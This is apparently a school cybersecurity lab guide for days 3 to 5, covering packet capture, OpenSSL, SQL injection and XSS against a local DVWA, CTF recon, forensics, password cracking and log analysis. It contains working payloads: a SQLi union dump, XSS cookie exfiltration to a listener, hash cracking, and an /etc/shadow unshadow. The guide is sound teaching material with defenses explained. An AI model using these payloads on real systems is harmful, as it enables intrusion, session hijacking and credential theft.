Day 3: Cryptography and Network Packet Analysis Day 3

Environment: K12 Cyber Security Concepts — Kali Linux 2025.7
Full Kali Linux desktop. Today you inspect live network traffic with Wireshark, decode ciphers in the terminal, and practice TLS certificate inspection and symmetric encryption with OpenSSL.

Part A: Opening Wireshark

1
Click Applications in the top-left corner of the Kali desktop, go to Sniffing and Spoofing, and click Wireshark.
Alternative — open a terminal and type: sudo wireshark & The & runs it in the background so the terminal stays usable. Press Enter if prompted to confirm running as root.
2
The Wireshark welcome screen shows a list of network interfaces. Each one shows a live sparkline if traffic is flowing. Select eth0 (or whichever your instructor specifies). Double-click it to begin capturing.
3
You will see rows scrolling by. Each row is one packet. The columns are: No. (sequence), Time (seconds since start), Source IP, Destination IP, Protocol, Length, and Info summary.

Part B: Capturing packets and saving a trace

1
While Wireshark is running, open Firefox and browse to any HTTP site your instructor provides (e.g., http://neverssl.com). Watch the packets appear in Wireshark.
2
Click the red square Stop button (or press Ctrl+E) to pause the capture. You now have a frozen snapshot to analyze.
3
Save the capture for later: File → Save As, name it day3_capture.pcap, choose your home directory, and click Save.
4
Reload the saved file from the terminal: wireshark ~/day3_capture.pcap &
What is a PCAP file? A packet capture. It stores a byte-for-byte recording of every frame that crossed the interface. SOC analysts collect PCAPs during incidents and replay them later to reconstruct exactly what happened.

Part C: Display filters

Type filters into the green bar directly below the toolbar and press Enter.

1
Apply the filter http. Click on any GET request row. The middle pane shows the protocol stack: Ethernet II → Internet Protocol → Transmission Control Protocol → Hypertext Transfer Protocol. Click the arrows to expand each layer.
2
Apply http.request.method == "POST". If you browsed to a page with a login form and submitted it over plain HTTP, you will see the username and password in the Info column or in the packet detail pane — this is why HTTPS is required for any real login.

Part D: Following a TCP stream

1
Right-click any HTTP packet → Follow → TCP Stream. A dialog opens showing the complete conversation: the client request is in red, the server response is in blue.
2
In the dialog, use Show data as → ASCII to read the raw HTTP headers and body. You can see cookies, User-Agent strings, and any form data the browser sent.
3
Export the stream: click Save as → name it stream1.txt. Then search it: grep -i "cookie\|set-cookie\|password\|token" ~/stream1.txt
4
Close the stream dialog. Now try Follow → UDP Stream on a DNS packet to see the raw DNS query and answer in text.

Part E: Inspecting TLS certificates from the terminal

1
Connect to a live site and read its certificate: echo | openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -noout -text | head -40 Certificate: Data: Version: 3 (0x2) Serial Number: ... Signature Algorithm: sha256WithRSAEncryption Issuer: C=US, O=Google Trust Services, CN=WR2 Validity Not Before: May 21 08:12:01 2025 GMT Not After : Aug 13 08:12:00 2025 GMT Subject: CN=*.google.com Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (2048 bit)
2
Show just the key fields — subject, issuer, validity dates: echo | openssl s_client -connect bsu.edu:443 2>/dev/null \ | openssl x509 -noout -subject -issuer -dates
3
Show the full certificate chain to see the intermediate and root CA: echo | openssl s_client -connect bsu.edu:443 -showcerts 2>/dev/null | grep "subject\|issuer"
4
Check when a certificate expires (useful for monitoring): echo | openssl s_client -connect bsu.edu:443 2>/dev/null \ | openssl x509 -noout -enddate notAfter=Nov 7 23:59:59 2025 GMT

Part F: Symmetric encryption with OpenSSL

1
Create a plaintext file: echo "TOP SECRET: meet at noon" > secret.txt
2
Encrypt it with AES-256-CBC. You will be prompted to create a passphrase: openssl enc -aes-256-cbc -pbkdf2 -in secret.txt -out secret.enc The file secret.enc is binary ciphertext — try opening it and you will see garbage.
3
Decrypt it (you will need the same passphrase): openssl enc -d -aes-256-cbc -pbkdf2 -in secret.enc -out recovered.txt cat recovered.txt TOP SECRET: meet at noon
4
Try decrypting with the wrong passphrase to see what happens: openssl enc -d -aes-256-cbc -pbkdf2 -in secret.enc -out wrong.txt -pass pass:wrongpass cat wrong.txt You get a decryption error or gibberish — the wrong key cannot recover the plaintext.
5
Generate an RSA key pair for asymmetric encryption: openssl genrsa -out private.pem 2048 openssl rsa -in private.pem -pubout -out public.pem
6
Encrypt a small message with the public key (RSA can only encrypt short data): echo "hello" | openssl pkeyutl -encrypt -pubin -inkey public.pem -out msg.enc openssl pkeyutl -decrypt -inkey private.pem -in msg.enc hello

Part G: Cipher tools in the terminal

1
Brute-force all 25 Caesar shifts on a ciphertext: python3 -c " txt='KHOOR, ZRUOG!' for s in range(1,26): d=''.join(chr((ord(c)-65-s)%26+65) if c.isalpha() else c for c in txt.upper()) print(f'shift {s:2d}: {d}') " shift 1: JGNNQ, YQTNF! ... shift 3: HELLO, WORLD! ...
2
Frequency analysis on a ciphertext — count letter occurrences: echo "KHOOR ZRUOG KHOOR NKDH" | tr '[:upper:]' '[:lower:]' \ | grep -o '[a-z]' | sort | uniq -c | sort -rn 4 o 3 k 2 r ...
3
Hash a string from the command line: echo -n "sunshine" | sha256sum echo -n "sunshine" | md5sum c0067d4af4e87f00dbac87c9f9f7b5ad6c69b01e07e39e1ecbb2e25e80c6a65b - 1f87d666a8b8c5a9eb22b8addf9c2a00 -
4
Decode Base64 strings: echo "SGVsbG8sIFdvcmxkIQ==" | base64 --decode Hello, World!
5
Encode a message in Base64 (to see it is not encryption): echo "attack at dawn" | base64 YXR0YWNrIGF0IGRhd24K

Day 4: Web Application Security — SQLi, XSS, Burp Suite Day 4

Environment: K12 Cyber Security Concepts — Kali Linux 2025.7
Kali Linux with Burp Suite Community Edition and DVWA (Damn Vulnerable Web App) already installed. All attacks run against the local DVWA instance — do not target any external site.

Part A: Starting DVWA (the practice target)

1
Open a terminal and start the web server and database: sudo service apache2 start sudo service mysql start * Starting Apache httpd web server apache2 [ OK ] * Starting MySQL database server mysqld [ OK ]
2
Open Firefox and go to http://localhost/dvwa. Log in with admin / password.
3
Click DVWA Security in the left menu. Set the security level to Low and click Submit. Low security means the validation is intentionally broken — that is what you will exploit.
4
If this is your first time, click Setup / Reset DB at the bottom of the left menu, then click Create / Reset Database. The page reloads and you may need to log in again.

Part B: Opening Burp Suite

1
Open a terminal and launch Burp Suite: burpsuite & Or go to Applications → Web Application Analysis → burpsuite.
2
When the startup dialog appears, choose Temporary project → click Next → choose Use Burp defaults → click Start Burp. The main dashboard loads.
3
Click the Proxy tab at the top. Confirm the sub-tab says Intercept is off for now (we will turn it on in Part D).

Part C: Configuring Firefox to route through Burp

1
In Firefox, click the three-bar menu (top right) → Settings → scroll down to Network Settings → click Settings...
2
Select Manual proxy configuration. Fill in:
  • HTTP Proxy: 127.0.0.1 Port: 8080
  • Check the box: Also use this proxy for HTTPS
Click OK.
3
Install Burp's CA certificate so Firefox can intercept HTTPS without errors. In Firefox, navigate to http://burpsuite. Click CA Certificate to download cacert.der.
4
Go to Firefox Settings → search "certificates" → click View Certificates → Authorities tab → Import. Select the downloaded cacert.der file. Check both trust boxes and click OK.
5
Test the setup: browse to http://localhost/dvwa in Firefox. Go to Burp → Proxy → HTTP history tab. You should see the DVWA requests appearing there even with Intercept off — Burp is silently logging everything.

Part D: Intercepting and modifying a request

1
In Burp → Proxy tab → click Intercept is off to toggle it to Intercept is on.
2
In Firefox, go to http://localhost/dvwa/vulnerabilities/sqli/. Type 1 into the User ID field and click Submit. Firefox will appear to hang — the request is paused inside Burp.
3
Look at the Burp Intercept tab. You see the raw HTTP request: GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1 Host: localhost Cookie: security=low; PHPSESSID=abc123
4
Right-click anywhere in the request text and choose Send to Repeater. Then click Forward to let the original request through. Turn Intercept off.
5
Click the Repeater tab. The request is here now. Change the id=1 parameter to different values and click Send each time. Inspect the Response panel on the right — you control the request without using the browser at all.

Part E: SQL injection

1
In Firefox, go to http://localhost/dvwa/vulnerabilities/sqli/. In the User ID box, type a single quote: ' Click Submit. You should see a MySQL error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version... This confirms the field is inserting your input directly into a SQL query without sanitizing it.
2
Understand what is happening. The app's query looks like: SELECT first_name, last_name FROM users WHERE user_id = '$id'; When you type ', the query becomes: SELECT first_name, last_name FROM users WHERE user_id = '''; The unmatched quote breaks the SQL syntax — that is the error you saw.
3
Always-true injection — log in without knowing a valid ID: 1' OR '1'='1 The query becomes: SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1'; The OR '1'='1' is always true, so every row in the users table is returned.
4
Union injection to read column names from the database schema: 1' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_name='users'-- - ID: 1' UNION ... First name: users Surname: user_id First name: users Surname: first_name First name: users Surname: password
5
Dump all usernames and hashed passwords: 1' UNION SELECT user,password FROM users-- - First name: admin Surname: 5f4dcc3b5aa765d61d8327deb882cf99 First name: gordonb Surname: e99a18c428cb38d5f260853678922e03 Copy one of those MD5 hashes and paste it into crackstation.net — it cracks in seconds because they are unsalted MD5.
Defense: All of the above is prevented by parameterized queries (also called prepared statements). The code separates the query structure from the user data so it is impossible for a quote to break the SQL syntax.

Part F: Cross-site scripting (XSS)

1
Go to http://localhost/dvwa/vulnerabilities/xss_r/. Type your name and click Submit. The page echoes it back: "Hello, [name]!" The app is reflecting your input directly into the HTML.
2
Inject a script tag instead of a name: <script>alert('XSS works!')</script> A JavaScript alert dialog pops up. You just ran code in the victim's browser.
3
Inject HTML to deface the page: <h1 style="color:red">HACKED</h1> The page layout changes to show your injected heading.
4
More dangerous — read cookies (this shows why HttpOnly matters): <script>alert('Cookie: ' + document.cookie)</script> The alert shows the session cookie. A real attacker would send this to their own server instead of an alert.

Part G: Cookie stealing demonstration

1
In your terminal, start a simple HTTP listener to catch incoming "stolen" cookies: python3 -m http.server 9999 Leave this terminal running.
2
In DVWA Reflected XSS, inject a payload that sends the cookie to your listener: <script>new Image().src='http://127.0.0.1:9999/?c='+document.cookie</script>
3
Switch back to the terminal window running the Python server. You will see the request arrive: 127.0.0.1 - - [23/Jun/2026 10:14:02] "GET /?c=security=low;%20PHPSESSID=abc123 HTTP/1.1" 200 - The session cookie has been exfiltrated — a real attacker would use this to hijack the session.
4
Stop the listener with Ctrl+C.
Defenses: (1) Output encoding — encode < and > before inserting user data into HTML. (2) HttpOnly cookie flag — prevents JavaScript from reading document.cookie. (3) Content Security Policy (CSP) — blocks inline scripts entirely.

Day 5: CTF, Forensics, and Blue-Team Analysis Day 5

Environment: K12 Cyber Security Concepts — Kali Linux 2025.7
Kali Linux with the full CTF toolkit. Your instructor loads the mini-CTF targets before the session. Flags are in the format FLAG{...}.

Part A: Network reconnaissance with Nmap

1
Get your own IP and subnet: ip addr show eth0 | grep "inet " inet 10.0.0.50/24 brd 10.0.0.255 scope global eth0 Your IP is 10.0.0.50 and the /24 means all IPs from 10.0.0.1 to 10.0.0.254 are in your subnet.
2
Discover all live hosts on the subnet: nmap -sn 10.0.0.0/24 Nmap scan report for 10.0.0.10 Host is up (0.0012s latency). Nmap scan report for 10.0.0.20 Host is up (0.0019s latency). -sn is a ping sweep — no port scanning yet, just finds who is online.
3
Full scan of the target your instructor gives you — service versions and default scripts: nmap -sV -sC -oN scan.txt 10.0.0.10 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 80/tcp open http Apache httpd 2.4.52 3306/tcp open mysql MySQL 8.0.32 -sV probes service versions. -sC runs default NSE scripts. -oN saves output to a file.
4
Scan all 65535 ports (slower but more thorough): nmap -p- --min-rate 5000 -oN fullscan.txt 10.0.0.10 The --min-rate 5000 sends at least 5000 packets per second — fast enough for a CTF range.
5
Banner grab on a specific port to identify a service: nc 10.0.0.10 80 HEAD / HTTP/1.0 (Press Enter twice after the blank line.) The server sends back its HTTP headers including the Server: version string.

Part B: Web enumeration and source inspection

1
Brute-force hidden directories and files on the web target: gobuster dir -u http://10.0.0.10 -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt /admin (Status: 200) [Size: 1234] /backup (Status: 403) [Size: 289] /robots.txt (Status: 200) [Size: 56] Always check /robots.txt — it often lists paths the site owner does NOT want indexed, which can be exactly what you are looking for.
2
Read robots.txt from the terminal: curl -s http://10.0.0.10/robots.txt User-agent: * Disallow: /secret/ Disallow: /flag.txt
3
Download and search the page source for hidden flags or comments: curl -s http://10.0.0.10/admin/ | grep -i "flag\|FLAG\|<!--\|hidden\|secret"
4
Download all linked files for offline analysis: wget -r -l 1 --no-parent http://10.0.0.10/admin/ -P ./site_dump/
5
Look for flags in JavaScript files — they are often left in comments: curl -s http://10.0.0.10/admin/app.js | grep -i "flag\|key\|secret\|pass"

Part C: File forensics

1
Identify any file regardless of its extension — never trust a filename: file mystery.bin mystery.bin: PNG image data, 640 x 480, 8-bit/color RGB, non-interlaced
2
Extract all printable ASCII strings (minimum 6 chars) and search for a flag: strings -n 6 mystery.bin | grep -i "flag\|FLAG\|CTF"
3
Look at the hex dump — the first few bytes (magic bytes) identify the file format: xxd mystery.bin | head -4 00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452 .PNG........IHDR 89 50 4e 47 is the PNG magic number. A file claiming to be a JPEG but starting with these bytes is actually a PNG — or something else is hidden inside it.
4
Scan for embedded files inside an image or binary: binwalk mystery.bin DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 640 x 480 12345 0x3039 Zip archive data, at least v2.0
5
Extract all embedded files found by binwalk: binwalk -e mystery.bin A folder named _mystery.bin.extracted/ appears containing all embedded files. List them: ls _mystery.bin.extracted/ cat _mystery.bin.extracted/flag.txt
6
Read EXIF metadata from an image (coordinates, device, creation date): exiftool mystery.bin File Type : PNG Image Width : 640 Image Height : 480 Comment : FLAG{metadata_hiding} Flags are sometimes stored as EXIF comments.

Part D: Password cracking

1
Identify the hash type before cracking. Hash-identifier is built into Kali: hash-identifier Paste the hash at the prompt. It will guess the algorithm (MD5, SHA-1, bcrypt, etc.).
2
Crack an MD5 hash with John the Ripper using the rockyou wordlist: echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3]) password (?) 1g 0:00:00:01 DONE
3
Show cracked passwords stored in John's pot file: john --show --format=raw-md5 hash.txt ?:password 1 password hash cracked, 0 left
4
Crack with hashcat (GPU-accelerated — faster on a real machine, educational here): hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force -m 0 is the mode for MD5. For SHA-1 use -m 100, for bcrypt use -m 3200.
5
Crack a Linux /etc/shadow entry. If the instructor provides one: unshadow /etc/passwd /etc/shadow > combined.txt john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt

Part E: Steganography

1
Check if a flag is appended after the image data: tail -c 100 image.png | strings FLAG{appended_to_end}
2
Extract hidden data embedded with steghide (requires a passphrase your instructor gives you): steghide extract -sf image.jpg -p "password" wrote extracted data to "flag.txt". cat flag.txt
3
If you do not know the passphrase, try an empty one (common in CTFs): steghide extract -sf image.jpg -p ""
4
Check for LSB (least-significant-bit) steganography using zsteg (PNG and BMP only): zsteg image.png b1,r,lsb,xy .. text: "FLAG{lsb_steg}"
5
Decode a QR code or barcode from an image: zbarimg image.png QR-Code:FLAG{qr_code_flag}

Part F: Log analysis (blue-team)

1
View the most recent SSH login attempts: sudo grep "Failed password\|Accepted password" /var/log/auth.log | tail -30
2
Count failed attempts per source IP to spot a brute-force: sudo grep "Failed password" /var/log/auth.log \ | awk '{print $11}' | sort | uniq -c | sort -rn | head -10 342 192.168.1.105 18 10.0.0.44 The IP with 342 failures is almost certainly an automated attacker.
3
Find the time window of the attack: sudo grep "Failed password.*192.168.1.105" /var/log/auth.log | head -1 sudo grep "Failed password.*192.168.1.105" /var/log/auth.log | tail -1 Subtract the timestamps to see how fast the brute-force was running.
4
Check if the attacker ever succeeded: sudo grep "Accepted password.*192.168.1.105" /var/log/auth.log An entry here means the attacker got in — this is evidence of compromise.
5
Search Apache web server logs for SQL injection attempts: sudo grep -i "union\|select\|1=1\|'--\|or%201" /var/log/apache2/access.log | head -20
6
Find all IPs that requested a specific page (attacker may use scanners): sudo awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head
